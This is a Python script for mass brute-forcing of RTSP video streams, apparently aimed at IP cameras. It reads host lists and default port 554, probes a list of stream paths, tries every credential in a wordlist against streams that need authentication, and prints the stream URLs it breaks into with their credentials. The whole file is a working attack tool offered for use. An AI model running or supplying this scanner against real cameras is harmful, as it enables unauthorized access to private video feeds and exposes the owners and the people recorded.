#!/usr/bin/env python3
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import os
from pathlib import Path
import sys

from colorama import init as colorama_init
from colorama import Fore
from fire import Fire
from tqdm import tqdm

from lib.net import RTSPConnection, logger as net_logger


FAKE_PATH = '/i_am_network_researcher'

WORK_DIR = Path(os.path.dirname(os.path.abspath(__file__)))

DATA_DIR = WORK_DIR / 'data'
LOCAL_DIR = WORK_DIR / 'local'

LOG_FILE = LOCAL_DIR / 'rtsp_brute.log'
PATHS_FILE = DATA_DIR / 'rtsp_paths.txt'
CREDS_FILE = DATA_DIR / 'rtsp_creds.txt'


paths: list
creds: list


def brute(connection: RTSPConnection, path: str):
    for cred in creds:
        response = connection.auth(path, cred)

        if response.error:
            break

        if response.found:
            return connection.url(path, cred)


def fuzz(connection: RTSPConnection, single_path: bool = True):
    results = []

    for path in paths:
        response = connection.get(path)

        if response.error:
            break

        if response.found:
            if path == FAKE_PATH:
                path = '/'

            results.append(connection.url(path))

        if response.auth_needed and path != FAKE_PATH:
            result = brute(connection, path)

            if result:
                results.append(result)
            else:
                break

        if single_path and results:
            break

    return results


def process_target(target_params: tuple[str, int, bool, str]) -> list[str]:
    host, port, single_path, interface = target_params

    with RTSPConnection(host, port, interface) as connection:
        if connection.query().ok:
            return fuzz(connection, single_path)

    return []


def main(H: str = '', P: str = '', C: str = '', w: int = None, sp: bool = False, i: str = '', d: bool = False, de: bool = False):
    global paths
    global creds
    paths = [FAKE_PATH] + [ln.rstrip() for ln in open(P or PATHS_FILE)]
    creds = [ln.rstrip() for ln in open(C or CREDS_FILE)]
    if d or de:
        colorama_init()
        FY = str(Fore.YELLOW)
        FR = str(Fore.RESET)

        log_level = logging.DEBUG
        log_format_base = '[%(name)s %(levelname)s]\n%(message)s\n'
        log_format_c = FY + '[%(name)s %(levelname)s]' + FR + '\n%(message)s\n'
        formatter = logging.Formatter(log_format_base)
        formatter_c = logging.Formatter(log_format_c)

        root_logger = logging.getLogger()
        root_logger.setLevel(log_level)
        net_logger.setLevel(log_level)

        file_handler = logging.FileHandler(LOG_FILE, 'w')
        file_handler.setLevel(log_level)
        file_handler.setFormatter(formatter)
        root_logger.addHandler(file_handler)

    if de:
        stream_handler = logging.StreamHandler(sys.stderr)
        stream_handler.setLevel(log_level)
        stream_handler.setFormatter(formatter_c)
        root_logger.addHandler(stream_handler)

    results = []
    hosts_file_path = H or LOCAL_DIR / 'hosts_554.txt'

    with ThreadPoolExecutor(w) as executor:
        with open(hosts_file_path) as hosts_file:
            futures = {}

            for line in hosts_file:
                host = line.rstrip()
                port = 554

                if ':' in host:
                    host, port = host.split(':')

                arg = (host, port, sp, i)

                future = executor.submit(process_target, arg)
                futures[future] = arg

            with tqdm(total=len(futures)) as progress:
                for future in as_completed(futures):
                    host, port, *_ = futures[future]
                    res = future.result()
                    progress.update()
                    results += res

    for result in results:
        print(result)


if __name__ == "__main__":
    try:
        Fire(main)
    except KeyboardInterrupt:
        print('Interrupted by user')
        sys.exit(130)
